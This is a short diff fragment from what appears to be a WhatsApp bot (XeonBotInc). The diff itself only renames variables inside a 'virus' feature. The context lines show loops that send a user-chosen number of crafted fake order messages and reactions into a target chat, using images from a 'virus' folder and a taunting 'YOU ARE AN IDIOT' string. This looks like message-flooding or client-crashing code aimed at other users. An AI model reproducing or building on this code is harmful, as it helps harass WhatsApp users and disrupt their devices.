@@ -5639,7 +5639,7 @@ jumlah = `${encodeURI(q)}`
 ydd = `YOU ARE AN IDIOT`
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./virus/image/hwmodsgans.jpg') }, { upload: XeonBotInc.waUploadToServer })
-var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+var order1 = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
  "orderMessage": {
 "orderId": "449756950375071",
 "orderImage": messa.imageMessage,
@@ -5665,7 +5665,7 @@ jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
 a = await XeonBotInc.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
 let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${global.ownername}`,jpegThumbnail: thumb}}}
-var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+var order2 = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
 "orderId": "599519108102353",
 "thumbnail": virgam,
